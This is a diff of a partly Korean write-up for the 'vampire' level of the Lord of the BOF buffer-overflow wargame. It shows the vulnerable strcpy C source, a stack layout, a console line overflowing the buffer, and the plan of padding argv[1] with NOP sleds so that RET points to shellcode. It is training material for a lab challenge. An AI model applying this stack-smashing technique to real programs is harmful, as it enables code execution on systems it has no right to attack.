@@ -1,43 +1,28 @@
 ============================================================================================================
-[lob] troll
+[redhat-lob] (9) vampire
 ============================================================================================================
 
-.. uml::
-    
-    @startuml
 
-    start
+.. graphviz::
 
-    :Source Analysis;
+    digraph foo {
+        a -> b -> c -> d -> e;
 
-    :Memory Structure;
-
-    :Segmentation fault;
-
-    :argv[1]의 주소값 변경;
-
-    :RET 주소를 argv[1] 주소로 변경하여 공격 진행;
-    
-    stop
-
-    @enduml
+        a [shape=box, label="argv[1] value"];
+        b [shape=box, color=lightblue, label="strcpy"];
+        c [shape=box, label="Buffer Overflow"];
+        d [shape=box, label="RET"];
+        e [shape=box, label="argv[1] address"];
+    }
 
 
 |
 
-Source Analysis
+Source Code
 ============================================================================================================
 
 
-해당 문제 소스코드는 다음과 같습니다.
-
 .. code-block:: c
-
-    /*
-        The Lord of the BOF : The Fellowship of the BOF
-        - vampire
-        - check 0xbfff
-    */
 
     #include <stdio.h>
     #include <stdlib.h>
@@ -66,41 +51,45 @@ Source Analysis
 
         strcpy(buffer, argv[1]);
         printf("%s\n", buffer);
+        printf("%p\n", buffer);
     }
 
 
 |
 
-Memory Structure
+Vulnerabliity Vector
 ============================================================================================================
 
-스택 메모리 공간에 다음과 같이 들어가게 됩니다.
+스택 메모리 공간에 다음과 같이 들어가게 된다.
 
 .. code-block:: console
 
     ================
     LOW     
     ----------------
-    Buffer  (40byte) <- strcpy
+    Buffer  (40byte)
     SFP     (4byte)
-    RET     (4byte)
-    argc    (4byte)
-    argv    (4byte)
+    RET     (4byte)  <- strcpy overflow
+    argc    (4byte)  <- 0x00000002
+    argv    (4byte)  <- argv 주소
     ----------------
     HIGH    
     ================
 
 |
 
-Segmentation fault
+Buffer Overflow
 ============================================================================================================
 
-strcpy로 인해 입력한 값이 버퍼보다 클 경우 오버플로우가 발생됩니다.
+Overflow condition 
 
-※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행해야 합니다.
+- argv[1] value의 47번째 문자가 "\\xbf"이어야 함
+- argv[1] value의 46번째 문자가 "\\xff"가 아니어야 함
 
 .. code-block:: console
 
+    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
+    $ bash2
     $ ./vampire2 `python -c 'print "a"*47'`
 
     stack is still your friend.
@@ -120,7 +109,7 @@ exploit
 argv[1]의 주소값 변경
 ------------------------------------------------------------------------------------------------------------
 
-argv[1]의 주소가 \\xbf\\xff로 시작하기 때문에 argv[1]에 nop를 100000만큼 삽입하여 주소값을 \\xbf\\xfe로 시작하도록 합니다.
+argv[1]의 주소가 "\\xbf\\xff"로 시작하기 때문에 argv[1]에 nop를 100000만큼 삽입하여 주소값을 "\\xbf\\xfe"로 시작하도록 한다.
 
 .. code-block:: console
 
@@ -143,8 +132,9 @@ RET 주소를 argv[1] 주소로 변경하여 공격 진행
     Buffer  (40byte) <- "\x90"*40
     SFP     (4byte)  <- "\x90"*4
     RET     (4byte)  <- argv[1] address
-    argc    (4byte)  <- "\x90"*4
-    argv    (4byte)  <- "\x90"*100000 + shellcode
+    argc    (4byte)  <- 0x00000002
+    argv    (4byte)  <- argv[0] 주소
+    argv[1] (4byte)  <- "\x90"*100000 + shellcode
     ----------------
     HIGH    
     ================
